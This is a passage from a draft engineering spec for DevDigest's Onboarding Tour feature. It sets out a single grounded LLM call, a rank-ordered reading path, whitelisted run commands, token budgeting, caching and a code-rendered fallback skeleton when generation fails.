# Onboarding Generator — one narrative call, a rank-ordered reading path, and a skeleton that always renders

**Status:** draft
**Packages touched:** server, client, `@devdigest/shared`
**Design source:** `design-mocks/src/24-screen_tour_context.jsx:63-81` (`ScreenTour`, the
half marked *N5 Onboarding Tour*). The other half of that file, `ScreenContext`
(`24-screen_tour_context.jsx:103-139`), is **Project Context — already shipped**
(`specs/09-project-context.md`) and is not re-specified here.
**Supersedes:** `specs/11-onboarding-tour.md`
**Borders on:** `specs/09-project-context.md` — the discovered `.md` document set is an
*input* here (P6); this feature never lists, attaches or edits a document.
`specs/08-blast-radius.md` — that feature is PR-scoped (`BlastService.forPull`,
`server/src/modules/blast/service.ts:27`) and is **not** reused; this feature calls the
`repoIntel` facade directly, as `blast` itself does. `specs/10-pr-brief.md` — the budget
measurement here is the same soundness fix its amendment A-3 made
(`specs/10-pr-brief.md:417-450`), applied to a different schema.

---

## Why this supersedes spec 11

Spec 11 is sound and most of it is carried over verbatim. One clause is not.

The lab's acceptance checklist for this feature reads, verbatim: *"Onboarding Generator
робить один наративний LLM-виклик, а reading path сортується за рангом"* — **one narrative
LLM call**, and a reading path **sorted by rank**. Spec 11's R6 already gives the second
half. Its R7 mandates **exactly two** concurrent structured calls (A narrative, B
practical), which is the first half's opposite.

That single change does not sit still. It moves the budget (one ceiling, not two), the
persisted trace (one set of numbers, not per-call), the failure posture (there is no
longer a "half the tour generated" outcome, so a *skeleton* has to take its place), one
corner case out of existence (spec 11's C13, "call A succeeds, call B times out") and six
acceptance criteria. Six edits to a 446-line document would bury the change rather than
publish it, which is why this is a new file and not an amendment in the shape of
`specs/10-pr-brief.md`'s A-1…A-3.

**Everything spec 11 forbids the model to author is unchanged and must not weaken:** the
mermaid diagram is rendered in code (R2), the reading path's order and set come from
`getTopFilesByRank` intersected with the critical-path chain heads with the model writing
only the `why` (R6), difficulty is computed from caller count and rank percentile with any
model-supplied value discarded (R9), every emitted command is verbatim-matched against a
whitelist derived from the repo's own config files (R5), and every path is grounded
against the derived reference set (R10).

### Two claims in spec 11 that I re-verified and one is wrong

| Spec 11 claim | Verified on `task/11-onboarding-tour` | Effect here |
| --- | --- | --- |
| Nav label lives at `client/messages/en/shell.json:19` | **True** — `"onboarding-tour": "Onboarding Tour"`. (`client/src/vendor/ui/shell.json` does not exist; that path is a red herring.) | R20 unchanged |
| `deepseek/deepseek-v4-flash` "may not be in `PRICING`", making `cost_usd` permanently `null` | **False.** `server/src/adapters/llm/pricing.ts:52` carries `'deepseek/deepseek-v4-flash': { in: 0.14, out: 0.28 }`, and migration `0010_modern_professor_monster.sql:29` seeds the same row. `cost_usd` is computable. | Cost NFR states a real cost; Q4 stays open for the CTO on a **different** ground (see Q4) |

---

## Problem

A developer opening an unfamiliar repository in DevDigest can see its pull requests, its
conventions and its `.md` documents, and nothing that answers *"where do I start"*.
`repo-intel` has already computed most of the answer — PageRank file importance
(`server/src/modules/repo-intel/pipeline/rank.ts:16-70`), an import graph (`file_edges`,
`server/src/db/schema/repo-intel.ts:55-68`), dependency chains from the top-ranked files
(`RepoIntelService.getCriticalPaths`, `server/src/modules/repo-intel/service.ts:670-709`,
whose own doc comment names this use case: *"onboarding reading-path"*) — and **nothing
reads it**. `getCriticalPaths` and `getTopFilesByRank` have no call site in the product.

The wire is likewise laid and dead. Every row below was re-checked on branch
`task/11-onboarding-tour`, not copied on trust:

| Already exists | Where (verified) | State |
| --- | --- | --- |
| `Onboarding` / `OnboardingSection` / `OnboardingLink` Zod contracts | `server/src/vendor/shared/contracts/knowledge.ts:31-50` | never imported by a producer or a consumer |
| `onboarding` table — `repo_id` PK, `json`, `generated_at` | `server/src/db/schema/context.ts:120-126` | never read, never written |
| `FEATURE_MODELS` entry `onboarding` — label *"Onboarding Tour"*, default `anthropic` / `claude-haiku-4-5` (repointed 2026-08-26, Q4) | `server/src/vendor/shared/contracts/platform.ts:43-50` | selectable in Settings, resolves to nothing |
| System prompt with `{{sections}}`, grounding rules, a SECURITY paragraph and mermaid rules | `server/src/prompts/onboarding.system.md` (2 426 bytes, present) | loaded by nothing; `server/src/platform/prompts.ts:23` names it only as a doc-comment example |
| Message namespace `title`, `regenerate`, `generate.*`, `loadError.*` | `client/messages/en/onboarding.json` | rendered by no component |
| Nav **label** `"onboarding-tour": "Onboarding Tour"` | `client/messages/en/shell.json:19` | no nav entry uses it — `client/src/vendor/ui/nav.ts:21-41` has `pulls`, `context`, `skills`, `agents`, `conventions` and nothing else |
| `MermaidDiagram` (validates with `mermaid.parse`, `securityLevel: "strict"`) and `react-markdown` + `remark-gfm` | `client/src/components/mermaid-diagram/MermaidDiagram.tsx:17-45` | ready |

So the cost is lower than it looks: the analysis is computed and persisted, and most of the
contract, storage, model-selection and rendering wire is in place. **The work is the
derivation layer, one grounded model call, and one screen.**

### The live defect this feature inherits

`client/src/components/app-shell/helpers.ts:29` reads
`if (pathname.includes("/onboarding")) return "onboarding-tour";`. `/onboarding` is the
**add-repository first-run wizard** (`client/src/app/onboarding/page.tsx`, `AddRepoView`,
design mock 15, `e2e/specs/06-onboarding.flow.json`) — so the shell already highlights a
nav row that does not exist, for a screen that is not this feature. R20 fixes the predicate
along with adding the row.

And the row itself lands in `client/src/vendor/ui/nav.ts`, which is under
`**/src/vendor/**` — vendored, and `CLAUDE.md` says do not touch it. Adding the entry is
therefore a **deliberate act**, not a routine edit, and the file's own comment
(`nav.ts:33-35`) says only routes that exist may be listed. The entry lands in the same
change as the page, never before it.

---

## Goals

- G1 · A developer who has never seen the repository can, from one page, name where the code
  lives, how a request moves through it, how to get it running, what to read in what order,
  and what to attempt first.
- G2 · Every path the page shows resolves to a file that exists **at the moment it is
  rendered**, not merely when it was generated.
- G3 · The generative part is bounded: the model phrases and annotates facts the server
  derived; it never supplies a path, a command, an order or a difficulty label.
- G4 · Generating is a priced, budgeted, cached, **one-shot, one-call** operation with the
  PR Brief failure posture — degrade, persist, explain, never `5xx`.
- G5 · **When the call fails, the page still teaches.** Everything derived in code renders;
  only the prose is missing, and the page says so.

## Non-goals

- N1 · Editing, annotating or pinning a tour. Read-only.
- N2 · Multi-repo or org-level onboarding. One repo, one tour.
- N3 · Read-tracking or a progress checklist.
- N4 · Turning a first task into a branch, an issue, or an agent run.
- N5 · Any change to how `repo-intel` indexes, or to `getBlastRadius`'s one-hop reach
  (`specs/08-blast-radius.md:37`).
- N6 · Non-JS/TS analysis. The indexer parses `.ts/.tsx/.js/.jsx/.mjs/.cjs` only
  (`server/src/modules/repo-intel/constants.ts:16`); a Python repo gets a tour built from
  config files and the file walk, and the page says so (C3).
- N7 · Retrieval/embedding over the repo's documents (`specs/09-project-context.md:61-63`).
- N8 · A second model call to recover a failed first one. R24's skeleton is the recovery;
  a retry is a user action (R17).

---

## Scope — in / out

**In:**
- `GET /repos/:id/tour` and `POST /repos/:id/tour`, plus a derivation layer over the
  existing `repoIntel` facade, the clone's config files and the discovered document set.
- **Exactly one** structured model call per generation (R7).
- The client page at `/repos/[repoId]/tour`, its nav entry, and its empty, loading, stale,
  skeleton and error states.
- Contract additions in `@devdigest/shared` (see *Contract changes*).

**Out:**
- Project Context and everything in `specs/09-project-context.md`.
- The `/onboarding` add-repository wizard, which keeps its route and its screen.
- A `routes_and_apis` section. `server/src/prompts/onboarding.system.md` names one; the
  five sections here do not include it, and its endpoint facts fold into *Critical paths*
  (R3).
- Sharing a tour outside the app (mock `:79`) → Q1, resolved: omit.

---

## Requirements

Requirement IDs are kept aligned with `specs/11-onboarding-tour.md` so a reader holding
both can diff them. **Changed here:** R7, R14, R15, R17, R20. **New:** R24.

| ID | Requirement | Source |
| --- | --- | --- |
| R1 | `GET /repos/:id/tour` returns `200` with `TourRecord \| null` — "no tour" is a state, not a `404`, matching `GET /pulls/:id/brief` (`server/src/modules/brief/routes.ts:29-53`). `POST /repos/:id/tour` with `{ force?: boolean }` generates or returns the cached record and always answers `200`. | house pattern · brief precedent |
| R2 | **Architecture is derived, narrated.** Every directory to depth 3 with its file count, its role mix from `_shared/file-roles.ts`, its highest-ranked file from `file_rank`, and the directory-to-directory import edges aggregated from `file_edges` are computed in code. The model writes only the prose `body` and one sentence per directory. The mermaid `diagram` is **rendered from the aggregated directory edges in code**; the model never authors it. | `repo-intel/repository.ts:432-437` · `schema/repo-intel.ts:55-68,105-121` |
| R3 | **Critical paths are derived, narrated.** Chains come from `repoIntel.getCriticalPaths(repoId)` (`service.ts:670-709`) — up to `CRITICAL_PATH_ROOTS = 5` chains of depth `BFS_DEPTH = 2` (`service.ts:713`) — annotated with the HTTP endpoints and crons their files declare, from `file_facts` (`schema/repo-intel.ts:75-88`). The model writes one "why this path matters" sentence per chain, keyed by `chain_id`. It may not add, remove or reorder a chain's files. | `service.ts:670-713` |
| R4 | **How to run is model-written**, from derived config facts only: `package.json` `scripts`/`packageManager`/`engines`, the lockfile present (→ package manager), the variable **names** in `.env.example`/`.env.sample`, `docker-compose*.yml` service names, and `Dockerfile` presence — all via `container.git.readFile` (`server/src/adapters/git/simple-git.ts:128-130`). This is the one section whose content is written rather than assembled. | request |
| R5 | **Every emitted step's command is checked verbatim in code against a whitelist derived from those same config facts** — `<pm> <script>` per declared script, `<pm> install`, `docker compose up -d <service…>`, `cp .env.example .env`, and nothing else. A step whose command is not in the whitelist is **dropped before persistence** and counted in `dropped_steps`. A command is the only model output in this product a human is invited to paste into a shell (`24-screen_tour_context.jsx:53`, the Copy control); it may not be free text. | R4 · security |
| R6 | **Guided reading is derived, narrated, and rank-ordered.** The ordered file list is `repoIntel.getTopFilesByRank(repoId, n, { exclude })` (`service.ts:646-663`) intersected with the `getCriticalPaths` chain heads, **emitted in descending rank order**. The model returns a `why` per path as a map keyed by path; it cannot express an order, and any order implied by its response is discarded. | lab checklist · `service.ts:646-709` |
| R7 | **Generation makes exactly one `completeStructured` call**, `maxRetries: 0` (`specs/10-pr-brief.md:390-401`, A-1), `timeoutMs: 45_000`. Its response is a **single object with five nullable keys** — `architecture { body, dirs: [{ path, note }] }`, `critical_paths: [{ chain_id, why }]`, `how_to_run { body, steps: [{ command, why }] }`, `guided_reading: [{ path, why }]`, `first_tasks: [{ candidate_id, title, why }]` — every list keyed by a **server-derived id** (`path`, `chain_id`, `candidate_id`), so the model annotates a fact set rather than composing one. A key that is `null`, absent, or keyed to an id not supplied is treated as that section's prose being unavailable (R24). | lab checklist · brief precedent |
| R8 | **First tasks are selected, not invented.** The server derives at most 12 candidates, each with evidence: `missing_test` (a `core`-role file per `_shared/file-roles.ts:29` with no matching test), `todo_marker` (a `TODO\|FIXME\|HACK` hit with path and line from `container.codeIndex.grep`, `server/src/adapters/codeindex/ripgrep.ts:50-54`), `unresolved_reference` (`repoIntel.getUnresolvedReferences`, `service.ts:585-634`), `undocumented_endpoint` (a `file_facts.endpoints` entry whose file is named in no discovered document). The model may **select at most 6 and rewrite their titles**; it may not add one. A task whose `candidate_id` is absent from the input is dropped before persistence. | grounding |
| R9 | **Difficulty is derived, never modelled.** Per selected task's `scope` path: `C` = distinct caller files from `repoIntel.getBlastRadius(repoId, [scope])` (`service.ts:221-305`), `P` = `file_rank.percentile` (`schema/repo-intel.ts:105-121`). **low** when `C ≤ 2` and `P < 50`; **high** when `C > 15` or `P ≥ 90`; **medium** otherwise. No `file_rank` row → `low` with basis `no_index_signal`. Any `difficulty` in the model response is discarded. The record persists `C`, `P` and the basis, and the card renders them beside the badge. | request · settled |
| R10 | Every path the tour emits — `links[].path`, reading entries, chain files, task `scope`, and any backticked path inside a `body` — is checked in code against the reference set built from the derived facts (indexed file list, walked directory list, discovered document paths). An unresolvable path is dropped before persistence and counted in `dropped_refs`, mirroring `groundBrief` (`server/src/modules/brief/grounding.ts:38-74`). This module gets its **own** grounding implementation; `pnpm arch`'s `no-cross-module-internals` forbids importing brief's (`specs/10-pr-brief.md:358-362`). | `brief/grounding.ts:38-74` |
| R11 | **Read-time re-resolution.** On every `GET`, each stored path is re-checked against the *current* index; one that no longer resolves renders struck-through and non-clickable with a "no longer in the repo" note, and is excluded from any count. | G2 |
| R12 | The tour is cached per **repo state** = `(repo_id, indexed_sha, indexer_version, prompt_version, provider, model)`. `GET`, and `POST` without `force`, return the cached row when every component matches; `POST { force: true }` regenerates. Staleness is **structural** — the key *is* the state, so a re-index is a cache miss and the superseded row is left in place, as `pr_brief_records_state_uq` does (`server/src/db/schema/reviews.ts:143-151`, `server/INSIGHTS.md:304-314`). | brief precedent |
| R13 | When `repo_index_state.last_indexed_sha` (`schema/repo-intel.ts:35-48`) differs from the record's `indexed_sha`, the page renders the tour with a stale marker naming the 7-character sha it was generated against, and **does not regenerate automatically**. | `specs/10-pr-brief.md` A14 |
| R14 | The pre-flight budget is measured with `container.tokenizer.count` (`server/src/adapters/tokenizer/index.ts:29`) over **`system + user + JSON.stringify(<the response JSON schema>)`**, the schema serialized by the same `toJsonSchema` the adapters use, so a schema edit moves the counted envelope in the commit that moves the billed one (`specs/10-pr-brief.md:417-450`, A-3). **One ceiling: 12 000 tokens.** Over ceiling, inputs are dropped in the *Provenance* drop order and re-measured; still over after every droppable input is gone, **the call is not made** and the record is persisted as a skeleton (R24) with `error: 'input_over_budget'`. | `server/INSIGHTS.md:286-302` · `specs/10-pr-brief.md:417-450` |
| R15 | The record persists **one** set of trace fields: `budget_tokens` (R14's pre-flight number), `tokens_in` (the provider's own `usage.input_tokens`, `server/src/adapters/llm/anthropic.ts:120,161` / `openai.ts:91,126`), `tokens_out`, `cost_usd`, `provider`, `model`, `prompt_version`, `dropped_inputs[]`, `dropped_refs`, `dropped_steps`, `skeleton_sections[]`, `generated_at`. Persisting both counts is what made the brief's envelope undercount visible in one query (`server/INSIGHTS.md:300-301`). `POST /repos/:id/tour` runs outside any agent run, so no `run_traces` row carries them. | `server/INSIGHTS.md:286-302` |
| R16 | Repository-derived text is **untrusted**: file and directory paths, symbol names, `package.json` script names and values, `.env.example` variable names, compose service names, `TODO` text, and any injected document. All go inside `wrapUntrusted(label, content)` (`reviewer-core/src/prompt.ts:45-49`). Because this call does not go through `assemblePrompt`, the tour's system prompt carries its own injection guard as `BRIEF_INJECTION_GUARD` does (`server/src/modules/brief/constants.ts:51-56`); `server/src/prompts/onboarding.system.md:9-11` already holds an equivalent paragraph and is where it lives. | request |
| R17 | Every failure degrades: no provider key, a timeout, a malformed structured response, an over-budget input, or a missing clone file writes a record with `degraded: true` and a human-readable `error`, and the page renders that plus a *Retry* that sends `force: true` (`specs/10-pr-brief.md:403-413`, A-2). With one call, the outcome space is binary — **full tour, or skeleton (R24)** — so there is no "half generated" state to design for. No model failure returns a `5xx` and none renders blank. | `specs/10-pr-brief.md:139` |
| R18 | With no `repo_index_state` row, or `status = 'failed'`, the page shows "this repo isn't indexed yet" with a link to `POST /repos/:id/resync` (`server/src/modules/repo-intel/routes.ts:43-65`) and a **disabled** *Generate*. When `status` is `partial` or `degraded`, generation proceeds and the tour carries a banner naming the degradation and the `files_skipped` count. | `schema/repo-intel.ts:35-48` |
| R19 | `@devdigest/shared` gains the section payloads and `TourRecord`, and narrows `OnboardingSection.kind` from `z.string()` to a five-value enum. The existing `Onboarding`, `OnboardingSection`, `OnboardingLink` shapes are **extended, not replaced** (`contracts/knowledge.ts:31-50`) — no other consumer exists to break. | contract hygiene |
| R20 | The page lives at `/repos/[repoId]/tour`, beside `context/` and `conventions/`. `/onboarding` remains the add-repository wizard. A nav entry `{ key: "onboarding-tour", href: "/repos/:repoId/tour" }` joins the `WORKSPACE` group in `client/src/vendor/ui/nav.ts:22-28` using the label already at `client/messages/en/shell.json:19`; that file is **vendored**, so the edit is deliberate and lands with the page, never before it (`nav.ts:33-35`). In the same change, `activeKeyFor` (`client/src/components/app-shell/helpers.ts:29`) stops mapping any path containing `/onboarding` to `onboarding-tour` and maps `/tour` instead, so the add-repo wizard no longer highlights this row. | design `:64,66` · defect above |
| R21 | Every new user-facing string is a `next-intl` key in the **existing** `client/messages/en/onboarding.json` namespace. Its `generate.body` today names a *different* five sections ("overview, architecture, key modules, getting started, and conventions & gotchas", `onboarding.json:10`) and must be rewritten to these five. A hardcoded literal is a defect. | `client/src/i18n/request.ts:9-12` |
| R22 | `POST /repos/:id/tour` is rate-limited to **5/min** — it spends money and its unit is a whole repository, so it is stricter than the brief's 10/min (`server/src/modules/brief/routes.ts:42`). | house pattern |
| R23 | Markdown `body` fields render through the existing `react-markdown` + `remark-gfm` path with raw HTML disabled; the diagram renders through `MermaidDiagram` (`MermaidDiagram.tsx:17-45`), which validates with `mermaid.parse` first, so an invalid diagram degrades instead of injecting a syntax-error graphic. | client wire |
| R24 | **Deterministic skeleton.** Whenever the call is not made (R14), fails, times out, or returns a response whose section key is null/absent/unparseable, the record is still persisted and the page still renders **every fact derived in code**: the depth-3 directory tree, the code-rendered mermaid diagram (R2), the critical-path chains with their endpoints (R3), the **rank-ordered** reading list (R6), the run steps **as the derived whitelist itself** in the fixed order `install → cp .env.example .env → docker compose up -d … → <pm> dev` (R5), and up to 6 task candidates under derived titles with difficulty computed as always (R8, R9). Only the model-authored prose — `body`, per-directory notes, `why` sentences, rewritten titles — is absent, and each affected section is listed in `skeleton_sections[]` and renders an honest inline status naming the reason. A skeleton is never blank, never a spinner, and never a `5xx`. | lab checklist · G5 |

---

## Provenance of inputs

One table now, because there is one call. **Budget** sums to **10 850**, inside R14's
12 000 ceiling; the ~1 150 headroom absorbs the five-section response schema growing a
field. **Drop order** is the sequence R14 applies — **lowest number goes first**. Inputs
marked *never* are grounding reference sets: dropping one would let the model emit an
ungrounded path, command or task, so the call is refused instead.

| # | Input | Source (`path:line`) | Trust | If missing | Budget | Drop order |
| --- | --- | --- | --- | --- | --- | --- |
| P1 | Instructions, five-section list, output schema, labels, **and the derived command whitelist** | `server/src/prompts/onboarding.system.md` (`{{sections}}`), rendered by `renderPrompt` (`server/src/platform/prompts.ts:39-41`) | **trusted** — outside every wrapper (R16) | n/a | 1 300 | never |
| P2 | Repo name, language mix, file/dir counts, `repo_index_state.status` + `files_skipped` | `repo_index_state` (`schema/repo-intel.ts:35-48`) | trusted (integers, enum) | no row → R18 blocks | 150 | never |
| P3 | Directory tree to depth 3: path, file count, role mix, top-ranked file | indexed file list + `file_rank` (`schema/repo-intel.ts:105-121`) + `_shared/file-roles.ts:29` | **untrusted** (paths) — wrapped | empty index → R18 | 1 800 | 5 — depth 3 first, then depth 2 |
| P4 | Directory-level import edges | aggregated from `file_edges` (`schema/repo-intel.ts:55-68`, read at `repo-intel/repository.ts:432-437`) | trusted (derived) | dropping this removes the model's ability to *describe* the graph; the diagram is code-rendered (R2) and still ships | 800 | 4 |
| P5 | Critical-path chains (`chain_id` + files) with endpoints/crons | `getCriticalPaths` (`service.ts:670-709`), `file_facts` (`schema/repo-intel.ts:75-88`) | **untrusted** (paths, endpoint strings) — wrapped | empty → C5 | 900 | never — R3/R10 reference set |
| P6 | Root `README.md` + up to 1 further discovered document matching `architecture\|contributing\|overview`, whole, capped | discovery (`server/src/modules/project-context/discovery.ts:1-53`), content via `container.git.readFile` | **untrusted** — wrapped | absent → omitted, no failure | 1 500 | 1 — first to go |
| P7 | Rank-ordered file list with percentiles | `getTopFilesByRank` (`service.ts:646-663`) | **untrusted** (paths) — wrapped | empty → guided reading degrades to chain heads | 600 | never — R6's set and its order |
| P8 | Signatures of exported symbols in the top 20 ranked files | `getSymbolsInFiles` (`service.ts:432-445`) | **untrusted** — wrapped | empty → omitted | 900 | 3 |
| P9 | Config facts: `package.json` `scripts`/`packageManager`/`engines`, lockfile name, `.env.example` variable **names**, compose service names, `Dockerfile` presence | `container.git.readFile` (`simple-git.ts:128-130`) | **untrusted** — wrapped (R16) | none present → C6 | 1 200 | never — R5's whitelist |
| P10 | First-task candidates with evidence (`candidate_id`, kind, scope, line, snippet ≤ 120 chars) | R8's four generators | **untrusted** — wrapped | zero → C7 | 1 400 | never — R8's reference set |
| P11 | Difficulty inputs `C` and `P` per candidate | `getBlastRadius` (`service.ts:221-305`), `file_rank` | trusted (integers) | missing → `no_index_signal` (R9) | 300 | 2 — difficulty is computed in code either way (R9); these only help phrasing |

**No `.env`/`.env.local` value, no secret, and no file content outside P6 and P10's
120-character snippets ever enters the call.** `.env.example` contributes variable *names*
only.

### What merging the two calls costs

Spec 11's split was justified on disjoint inputs and a five-section structured output, and
both reasons were real. Honestly stated, here is what merging costs and what it does not:

- **It does not cost latency.** Spec 11's two calls were *concurrent*, so wall clock was
  already one 45 s timeout. One call is the same 45 s.
- **It does cost budget headroom, but less than 7 000 + 4 000 suggests.** Merging saves one
  instruction header (P1 is 1 300 here versus 900 + 700 = 1 600 across two calls) and one
  copy of the repo/language facts (spec 11's P13, 100). It costs a larger single response
  schema, five sections instead of two or three, which R14 now counts. Net: 10 850 against
  11 000, and one ceiling of 12 000 rather than two that could each be under while the pair
  was absurd.
- **It does couple the drop order.** Under two calls, a huge directory tree could only
  crowd out narrative inputs. Now it competes with the config facts and the task candidates
  — which is exactly why P9 and P10 are marked *never*: the whitelist and the candidate set
  are what make R5 and R8 enforceable, and a budget squeeze must refuse the call (R14 →
  R24) rather than quietly un-ground it.
- **It does widen the blast radius of one failure**, from "two sections lost" to "all prose
  lost". R24 is the answer to that, and it is a better answer than a partial tour: a reader
  gets the same set of facts either way, and a single honest banner instead of four
  scattered error cards.
- **It costs structured-output reliability at a bigger schema**, on a model no code path
  has ever exercised. That risk is unresolved and recorded under *Could not establish*.

---

## Design analysis

### States the design covers

`24-screen_tour_context.jsx:63-81` draws exactly two:

1. **Empty** — `EmptyState`, icon `Boxes`, CTA *"Generate onboarding tour"*, body
   *"…Takes 30–60s and ~5,000 tokens."* (`:64`).
2. **Populated** — a sticky "On this page" rail over the five section ids
   (`architecture_overview`, `critical_paths`, `how_to_run`, `guided_reading`,
   `first_tasks`, `:3-13`), a header *"Generated from index of 12,450 files · last
   refreshed 2h ago"* (`:74`), *Regenerate* and *Share link* (`:75-76`), and five
   collapsible sections, all drawn open (`:30`).

Per-section shapes drawn: prose + one diagram (`:5,45`); a file list with per-file
descriptions and an *Open* button (`:7,46-50`); numbered command steps with Copy
(`:9,51-55`); a numbered reading list of `path` + `why` (`:11,56-60`); a 3-column task grid
of `t`/`scope`/`cx`, `cx` rendering as a `"<cx> complexity"` badge, green for `Low`
(`:13,61-65`).

### States it does not

| Axis | Gap in the mock | Requirement |
| --- | --- | --- |
| Emptiness | The empty state assumes an indexed repo. A repo with no index, a failed index, or zero JS/TS files is not drawn. | R18, C1, C3 |
| Emptiness | No per-section empty state — all five are drawn with content. | C5, C6, C7 |
| Cardinality | One directory / one chain is not drawn; nor is the many — the mock draws 4 files, 3 steps, 3 reading entries, 3 tasks, while `getCriticalPaths` returns up to 5 chains × 3 files and R8 selects up to 6 tasks, overflowing a 3-column grid. | C2, C8 |
| Extremes | A 180-character monorepo path in `MonoLink` (`:48`), a 400-character `package.json` script, a directory name that breaks the mermaid label rule the prompt itself warns about (`onboarding.system.md:31-34`). | C9, C10 |
| Time | No loading state and no in-flight *Regenerate*, for a 60-second operation. | C11 |
| Time | "last refreshed 2h ago" (`:74`) is decoration; nothing shows the *index* moved, which is the only staleness that matters. | R13, C12 |
| Failure | No degraded state at all. With one call (R7) the failure shape is now singular and total, and the mock has no shape for a prose-less page. | R17, R24, C13 |
| Permission | Not applicable — DevDigest has no per-user authorization surface; any viewer of a repo sees everything about it (`server/src/modules/repos/routes.ts` has no viewer scoping). Considered, not a gap. | n/a |
| Concurrency | Two viewers pressing *Regenerate* at once, and a `resync` completing mid-generation. The brief's upsert is knowingly non-atomic (`server/INSIGHTS.md:304-314`) and this inherits it. | C14, C15 |
| Reachability | The mock's `AppFrame` uses `active: "onboarding-tour"` (`:64`) but `nav.ts:21-41` has no such entry, so there is no drawn route in; nothing says what Back does from an anchored section. | R20, C16 |

### Divergence from `client/` today

| Mockup | Today (`path:line`) | Intended change (→ Rn) or mockup oversight (→ Qn) |
| --- | --- | --- |
| Nav item `onboarding-tour` | No entry; `nav.ts:33-35` forbids adding one before its screen exists, and the file is vendored | **Intended** → R20, landed with the page |
| Active-nav highlight for the tour | `helpers.ts:29` already returns `"onboarding-tour"` for the add-repo wizard at `/onboarding` | **Intended** — a live defect; R20 repoints it at `/tour` |
| Empty-state body naming *"architecture, critical paths, how to run, a reading order, and first tasks"* (`:64`) | `client/messages/en/onboarding.json:10` names five different sections | **Intended** — the mock is the design, the message string is stale wire → R21 |
| *"~5,000 tokens"* (`:64`) | No estimate exists | **Oversight** — R14's single ceiling is 12 000 pre-flight and the billed number is higher (`server/INSIGHTS.md:286-302`) → Q2 |
| *"Takes 30–60s"* (`:64`) | No timing exists | **Intended, achievable** — one 45 s call plus ≤ 10 s derivation → NFR *Latency* |
| Section id `architecture_overview` (`:4`) | `OnboardingSection.kind` is `z.string()` (`knowledge.ts:37`); `onboarding.system.md:27` says `architecture` and adds `routes_and_apis` | **Intended** — the mock's five ids win, the enum narrows → R19, Scope *Out* |
| *Share link* (`:76`) | No sharing surface exists | **Oversight** → Q1 (resolved: omit) |
| `cx` badge with no basis (`:13,64`) | Nothing exists | **Intended** — the badge gains its derived basis inline → R9 |
| Diagram drawn as hand-laid SVG (`TourMermaid`, `:15-28`) | `MermaidDiagram` is the house renderer | **Intended** — the mock's SVG is scaffolding → R23 |
| *Open* button per critical-path file (`:50`) | No file-viewer route exists | **Oversight** → Q3 (resolved: link to the host provider) |
| Sections all default open (`:30`) | n/a | **Intended** — keep; a collapsed tour hides the thing the page exists to show |

### UX improvements proposed

- **`proposed` · Show the difficulty basis beside the badge** — "Low · 1 caller · rank p31".
  Reason: a bare *Low complexity* is a claim a newcomer cannot check, and the one thing that
  costs them a day is picking a task that turns out to touch forty files.
- **`proposed` · Put the stale marker in the header, not a banner** — the header already
  carries the freshness line (`:74`), so it answers the question where the reader is already
  looking, instead of adding a second dismissible thing to ignore.
- **`proposed` · Render the skeleton banner once, at the top, not per section** — with one
  call (R7) every prose gap has the same cause, so four identical inline errors say the same
  thing four times. Reason: one accurate sentence about why the prose is missing is read;
  four are dismissed. Sections still carry a quiet "no summary" marker (R24).
- **`proposed` · Sort first tasks by difficulty ascending** — the mock's grid order is
  arbitrary. Reason: the section exists so a person can choose by confidence, and confidence
  reads top-left first.

---

## Module interaction

| From → to | Contract | Sync? | If the far side fails | Requirement |
| --- | --- | --- | --- | --- |
| client → server | `GET /repos/:id/tour` → `TourRecord \| null` | sync | request fails → `loadError.title` (`client/messages/en/onboarding.json`) + retry; a cached React Query result stays visible | R1, R17 |
| client → server | `POST /repos/:id/tour` `{force?}` → `TourRecord` | sync, up to 60 s | client timeout → the record is still being written server-side; the client re-`GET`s rather than reporting failure | R7, C11 |
| tour service → `repoIntel` facade | `getCriticalPaths`, `getTopFilesByRank`, `getSymbolsInFiles`, `getUnresolvedReferences`, `getBlastRadius`, `getFileRank` (`repo-intel/types.ts:137-172`) | sync, in-process, DB-backed, no model call | index missing/failed → R18 blocks; `degraded`/`partial` → generate with a banner | R2, R3, R6, R8, R9, R18 |
| tour service → `container.git` | `readFile(repo, path)` (`simple-git.ts:128-130`) | sync, filesystem | file absent → that config fact is absent; clone absent → degrade with `clone_unavailable` and render the skeleton | R4, R24, C6 |
| tour service → `container.codeIndex` | `grep(repo, pattern)` (`ripgrep.ts:50-54`) — ripgrep when resolvable, pure-Node walk otherwise | sync | throws or times out → `todo_marker` yields zero candidates; the other three generators still run | R8 |
| tour service → project-context discovery | `discoverDocuments(root)` (`discovery.ts:1-53`) — P6 and R8's `undocumented_endpoint` | sync, re-reads the clone per call | throws → P6 omitted, `undocumented_endpoint` yields nothing | R8 |
| tour service → LLM adapter | `completeStructured` **× 1**, `maxRetries: 0`, `timeoutMs: 45_000` | sync | throws, times out, or returns an unparseable object → **skeleton** (R24), `degraded: true`, `200` | R7, R17, R24 |
| tour service → `_shared/feature-models` | `resolveFeatureModel(container, workspaceId, 'onboarding')` (`server/src/modules/_shared/feature-models.ts:56-62`) | sync | no override → registry default `openrouter`/`deepseek/deepseek-v4-flash` (`platform.ts:43-50`), priced at `pricing.ts:52` | R12, R15 |

---

## Contract changes

`@devdigest/shared` (`server/src/vendor/shared/contracts/knowledge.ts:31-50`) — extend,
never replace:

- `OnboardingSectionKind` — new enum: `architecture_overview` · `critical_paths` ·
  `how_to_run` · `guided_reading` · `first_tasks`. `OnboardingSection.kind` narrows from
  `z.string()` to it (R19).
- `OnboardingSection` gains five optional, kind-specific payloads: `tree[]`
  (`{ path, files, role_mix, top_file, note }`), `paths[]`
  (`{ chain_id, files[], endpoints[], why }`), `run_steps[]` (`{ command, why }`),
  `reading[]` (`{ path, why, rank_percentile }`), `tasks[]`
  (`{ candidate_id, title, scope, why, difficulty, difficulty_basis: { callers, rank_percentile, signal } }`).
  Every `why`/`note` is **nullable**, because R24 persists the facts without them.
  `body`, `diagram` and `links` keep their current meaning; `body` becomes nullable for the
  same reason.
- `TourDifficulty` — new enum `low | medium | high` (R9). Deliberately **not** reusing
  `RiskSeverity`: a starter task's difficulty is not a risk level, and conflating them makes
  one enum answer to two features.
- `TourRecord` — `Onboarding` extended with R12's key components, R15's **single** trace
  block (`budget_tokens`, `tokens_in`, `tokens_out`, `cost_usd`, `provider`, `model`,
  `prompt_version`), `degraded`, `error`, `skeleton_sections[]`, `dropped_inputs[]`,
  `dropped_refs`, `dropped_steps`, `generated_at`. Note the shape change from spec 11: trace
  fields are no longer per-call.
- The `onboarding` table as it stands (`repo_id` PK, `json`, `generated_at`,
  `schema/context.ts:120-126`) **cannot express R12's key** — one row per repo, no key
  columns. The state key and the trace fields must be real columns, on the pattern of
  `pr_brief_records` (`schema/reviews.ts:113-153`), or R12's cache-miss-on-re-index is
